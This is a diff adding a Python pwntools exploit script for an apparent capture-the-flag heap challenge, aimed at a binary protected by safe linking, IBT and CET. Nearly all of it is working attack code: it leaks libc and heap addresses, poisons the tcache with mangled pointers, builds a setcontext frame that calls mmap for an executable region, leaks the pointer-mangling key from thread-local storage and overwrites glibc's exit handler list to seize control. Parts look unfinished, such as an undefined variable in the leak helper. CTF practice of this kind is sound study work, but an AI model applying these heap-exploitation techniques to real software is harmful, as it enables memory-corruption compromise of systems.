@@ -1,0 +1,247 @@
+#!/usr/bin/python3
+# Challenge: All binary protection, bypass safe linking, IBT & CET
+from pwn import *
+
+
+elf = context.binary = ELF("chall_patched", checksec=True)
+libc = elf.libc
+context.log_level = "debug"
+#context.log_level = "critical"  # quiet mode
+context.terminal = "konsole"
+gs = """
+b exit
+continue
+"""
+
+def start():
+    if args.GDB:
+        # Use GDB to debug the binary
+        return gdb.debug(elf.path, gdbscript=gs)
+    elif args.REMOTE:
+        # Connect to the remote service
+        return remote("0.cloud.chals.io", 33799)
+    elif args.QEMU:
+        # Run the binary under QEMU with specified arguments
+        qemu_cmd = ['./qemu-x86_64', '-plugin', './libcet.so,mode=user,ibt=on,ss=on,cpu_slots=128', '-d', 'plugin', "-g", "1234", elf.path]
+        return process(qemu_cmd)
+    else:
+        return process(elf.path)
+
+
+io = start()
+
+class ProgramInteraction:
+    @staticmethod
+    def malloc(index, size):
+        io.sendline(b"1")
+        io.sendlineafter(b"Index: ", str(index).encode())
+        io.sendlineafter(b"Size: ", str(size).encode())
+
+    @staticmethod
+    def edit(index, data):
+        io.sendline(b"2")
+        io.sendlineafter(b"Index: ", str(index).encode())
+        io.sendlineafter(b"Data: ", data)
+
+    @staticmethod
+    def free(index):
+        io.sendline(b"3")
+        io.sendlineafter(b"Index: ", str(index).encode())
+
+    @staticmethod
+    def leak(index) -> int:
+        io.sendline(b"4")
+        io.sendline(str(index).encode())
+        if setting == 1:
+            io.recvuntil(b"Data: ")
+        leak = io.recvline().strip()
+        return u64(leak[:8].ljust(8, b"\x00"))
+
+
+class Helper:
+    def __init__(self, p):
+        self.p = p
+
+    # rdi, rsi, rdx, rcx, r8, r9, r10, r11
+    """
+        0003fa9d  488ba2a0000000     mov     rsp, qword [rdx+0xa0]
+        0003faa4  488b9a80000000     mov     rbx, qword [rdx+0x80]
+        0003faab  488b6a78           mov     rbp, qword [rdx+0x78]
+
+        0003fb86  488b8aa8000000     mov     rcx, qword [rdx+0xa8]
+        0003fb8d  51                 push    rcx
+        0003fb8e  488b7270           mov     rsi, qword [rdx+0x70]
+        0003fb92  488b7a68           mov     rdi, qword [rdx+0x68]
+        0003fb96  488b8a98000000     mov     rcx, qword [rdx+0x98]
+        0003fb9d  4c8b4228           mov     r8, qword [rdx+0x28]
+        0003fba1  4c8b4a30           mov     r9, qword [rdx+0x30]
+        0003fba5  488b9288000000     mov     rdx, qword [rdx+0x88]
+
+        0003fa8d  488b8ae0000000     mov     rcx, qword [rdx+0xe0]
+        0003fa94  d921               fldenv  [rcx]
+    """
+    def create_ucontext(self, retaddr=0, rsp=0, rbp=0, rdi=0, rsi=0,
+                        rdx=0, rcx=0, r8=0, r9=0, r10=0, r11=0, rbx=0, fldenv_val=0) -> bytearray:
+        payload = bytearray(0xff)
+        # Set the values in the payload
+        payload[0xe0:0xe8] = p64(fldenv_val)  # must be a ptr to a ptr
+        payload[0xa0:0xa8] = p64(rsp)         # rsp
+        payload[0x80:0x88] = p64(rbx)         # rbx
+        payload[0x78:0x80] = p64(rbp)         # rbp
+
+        payload[0xa8:0xb0] = p64(retaddr)     # return address: passed through RCX 
+        payload[0x70:0x78] = p64(rsi)         # rsi
+        payload[0x68:0x70] = p64(rdi)         # rdi
+        payload[0x98:0xa0] = p64(rcx)         # rcx
+        payload[0x28:0x30] = p64(r8)          # r8
+        payload[0x38:0x40] = p64(r9)          # r9
+        payload[0x88:0x90] = p64(rdx)         # rdx
+
+        return payload
+
+
+    def setcontext32(self, **kwargs) -> bytes:
+        return flat( self.create_ucontext(**kwargs) )
+
+
+    def tcache_mangle(self, arbitrary_address: int, chunk_address: int) -> bytes:
+        return p64(arbitrary_address ^ (chunk_address >> 12))
+
+
+    def rol(self, value, shift, bit_width=64):
+        shift = shift % bit_width
+        return ((value << shift) & ((1 << bit_width) - 1)) | (value >> (bit_width - shift))
+
+
+    def _exit_func_demangle(self, ptr: int, key: int):
+        ptr_xored = ptr ^ key
+        return self.rol(ptr_xored, 0x11)
+
+
+class Phases:
+    def __init__(self, p, h):
+        self.p = p
+        self.h = h
+
+    # rebase libc & get heap leak
+    def phase_one(self) -> tuple:
+        io.recvuntil(b"Hello World: ")
+        system_leak = int(io.recvline().rstrip(), 16)
+        libc.address = system_leak - libc.sym.system
+
+        self.p.malloc(0, 0x3e0)
+        self.p.free(0)     
+        heap_base = self.p.leak(0) << 12
+        return heap_base
+
+
+    # do writes for getting a RWX mmap'd chunk
+    def phase_two(self):
+        self.p.malloc(1, 0x3e0)
+        self.p.malloc(2, 0x3e0)
+
+        self.p.free(1)
+        self.p.free(2)
+        """
+            rdi: address (NULL for the kernel to choose)
+            rsi: length (1000 bytes)
+            rdx: protection flags (PROT_READ | PROT_WRITE | PROT_EXEC)
+            rcx: flags (MAP_ANONYMOUS | MAP_PRIVATE)
+            r8: file descriptor (-1 for anonymous)
+            r9: offset (0)
+        """                                 
+        payload = self.h.setcontext32(rdi=0x400000000, rsi=0x1000,
+        rdx=0x7, rcx=0x22, r8=0xffffffffffffffff, r9=0, rbp=libc.sym.environ+8, fldenv_val=libc.sym.environ,
+        retaddr=libc.sym.mmap, rsp=libc.sym.environ+8)
+        print("PAYLOAD SIZE: ", len(payload))
+
+        self.p.edit(2, self.h.tcache_mangle(tls, heap_base+0x2a0))
+        for i in range(3, 5):
+            self.p.malloc(i, 0x3e0)
+        
+        self.p.edit(3, b"A"*16)
+        self.p.edit(4, payload)
+
+
+    # leak xor key used within cxa PTR_MANGLE
+    def phase_three(self) -> int:
+        fsbase = tls+0x740
+        xor_key = fsbase+0x30
+
+        self.p.malloc(0, 0x3e0)
+        self.p.malloc(1, 0x3e0)
+
+        self.p.free(0)
+        self.p.free(1)
+
+        self.p.edit(1, self.h.tcache_mangle(xor_key, heap_base+0x00690))
+
+        self.p.malloc(2, 0x3e0)
+        self.p.malloc(3, 0x3e0)
+
+        xor_key_leak = self.p.leak(3)
+        return xor_key_leak
+
+
+    def phase_four(self, key):
+        self.p.malloc(4, 0x3e0)
+        self.p.malloc(5, 0x3e0)
+
+        self.p.free(4)
+        self.p.free(5)
+        """
+        001d91b0      struct exit_function fns[0x20] = 
+        001d91b0      {
+        001d91b0          [0x00] = 
+        001d91b0          {
+        001d91b0              long int flavor = 0x0
+        001d91b8              union func = 
+        001d91b8              {
+        001d91b8                  void (* at)() = nullptr
+        001d91b8                  struct on = 
+        001d91b8                  {
+        001d91b8                      void (* fn)() = nullptr
+        001d91c0                      void* arg = nullptr
+        001d91c8                  }
+        001d91b8                  struct cxa = 
+        001d91b8                  {
+        001d91b8                      void (* fn)() = nullptr
+        001d91c0                      void* arg = nullptr
+        001d91c8                      void* dso_handle = nullptr
+        001d91d0                  }
+        001d91d0              }
+        -> Overwrite the start of exit_fuction struct, its first index is flavor, we want this to be 4 to trigger
+        the cxa struct being called on exit, and then we fill the function ptr and argument
+        not really sure what dso_handle does.
+        """
+        self.p.edit(5, self.h.tcache_mangle(libc.address+0x1d91b0, heap_base+0x01650))
+
+        self.p.malloc(6, 0x3e0)
+        self.p.malloc(7, 0x3e0)
+        # so either we make setcontext return to a libc got gadget such a strchrnul
+        self.p.edit(7, p64(0x4) + p64(self.h._exit_func_demangle(libc.sym.setcontext, key)) + p64(tls))
+
+
+if __name__ == "__main__":
+    program = ProgramInteraction()
+    helper = Helper(program)
+    phase = Phases(program, helper)
+
+    # phase one:
+    heap_base = phase.phase_one()
+    ld_base = libc.address+0x222000
+    tls = libc.address-0x3000
+
+    print(f"libc base @ {libc.address:#0x}")
+    print(f"ld base @ {ld_base:#0x}")
+    print(f"thread local storage @ {tls:#0x}")
+    print(f"heap base @ {heap_base:#0x}")
+
+    # step two:
+    phase.phase_two()
+    # step three:
+    xor_key = phase.phase_three()
+    # step four
+    phase.phase_four(xor_key)
+
+    io.interactive()
